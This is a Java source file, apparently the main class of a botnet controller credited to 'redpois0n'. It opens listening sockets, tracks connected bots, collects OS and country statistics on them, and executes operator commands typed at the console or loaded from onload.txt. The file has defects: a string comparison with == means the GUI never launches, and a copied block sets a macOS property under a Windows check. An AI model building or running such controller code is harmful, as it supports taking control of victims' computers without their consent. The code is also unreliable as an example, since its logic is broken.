package com.redpois0n.bot;

import java.io.File;
import java.net.ServerSocket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

import javax.swing.JFrame;
import javax.swing.UIManager;

import com.redpois0n.commands.Commands;
import com.redpois0n.common.Version;
//import com.redpois0n.oslib.OperatingSystem;
import oslib.OperatingSystem;
import com.redpois0n.ui.Frame;
import com.redpois0n.ui.stats.CountryStats;
import com.redpois0n.ui.stats.OsStats;
import oslib.AbstractOperatingSystem;




public class Main {
	
	public static boolean isRunning = true;
	public static boolean isVerbose = false;
	public static boolean isGui = false;
	public static boolean isStats = false;
	public static final Map<Integer, ServerSocket> sockets = new HashMap<Integer, ServerSocket>();
	public static final List<Bot> bots = new ArrayList<Bot>();
	public static Frame gui;

	/**
	 * Main entry point
	 * @param args
	 * @throws Exception
	 */
	public static void main(String[] args) throws Exception {
            System.out.println("Try GUI?:YES or NO?");
            // if you typed NO, then start your commands with (addsocket 1000 where 1000 is the port number)
            Scanner scanner = new Scanner(System.in);
            boolean test=false;
		String input = scanner.nextLine();
                if(input=="YES"){
                    test=true;
                }
                else{
                    
                }
		isStats = argsContains("-stats", args);
		if (isStats) {
			try {
				OsStats.load();
				CountryStats.load();
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
		AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
	//	if (argsContains("-gui", args)) {
        if(test==true){
			if (os.getType() == OperatingSystem.MACOS) {
				System.setProperty("apple.laf.useScreenMenuBar", "true");
			}
			isGui = true;
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
			Frame frame = new Frame();
			frame.setVisible(true);
			gui = frame;
                        
                        if (os.getType() == OperatingSystem.WINDOWS) {
				System.setProperty("apple.laf.useScreenMenuBar", "true");
			}
			isGui = true;
			UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
			Frame frame1 = new Frame();
			frame1.setVisible(true);
			gui = frame1;
		}

		new Thread(new ThreadPing(), "Ping Thread").start();
		
		log("Bot " + Version.getVersion() + " by redpois0n");
		log("Started");
		log("-------------------------------");	
		
		isVerbose = argsContains("-verbose", args);	
		
		try {
                    System.out.println("start");
			File startupCommands = new File("onload.txt");
                         System.out.println(startupCommands.exists());
			if (startupCommands.exists()) {
				String[] commands = Util.fileToArray(startupCommands);
				if (commands != null) {
					for (String s : commands) {
						try {
							Commands.execute(s.trim());
						} catch (Exception ex) {
							handleException(ex);
						}
					}
				}
				 System.out.println("Loaded " + commands.length + " startup commands");
				Main.log("Loaded " + commands.length + " startup commands");
			}
		} catch (Exception ex) {
                    System.out.println("Exception");
			Main.handleException(ex);
		}
		System.out.println("isGUI?");
                System.out.println(isGui);
		if (!isGui) {
			Scanner scanner1 = new Scanner(System.in);
			
			while (isRunning) {
				String input1 = scanner1.nextLine();
				
				try {
					Commands.execute(input1.trim());
				} catch (Exception ex) {
					handleException(ex);
				}
			}
			
			scanner.close();
			
			for (ServerSocket socket : sockets.values()) {
				socket.close();
			}
		}
		
		if (isStats && !isGui) {
			OsStats.save();
			CountryStats.save();
		}
	}
	
	
	/**
	 * Prints exception if it should
	 * @param ex
	 */
	public static void handleException(Exception ex) {
		if (isVerbose) {
			ex.printStackTrace();
			
			if (isGui) {
				gui.log(Util.getStackTrace(ex));
			}
		}
	}

	public static boolean argsContains(String key, String[] args) {
		for (String s : args) {
			if (s.equalsIgnoreCase(key)) {
				return true;
			}
		}
		
		return false;
	}
	
	public static void removeSocket(Bot bot) {
		bots.remove(bot);
	}
	
	public static void addSocket(Bot bot) {
		bots.add(bot);
	}
	
	public static void stop() {
		isRunning = false;
	}
	
	public static void log(String s) {
		System.out.println(s);
		
		if (isGui) {
			gui.log(s);
		}
	}

	public static synchronized void formatTitle(JFrame frame) {
		frame.setTitle("Bot GUI " + Version.getVersion() + " [" + bots.size() + "]");
	}

}
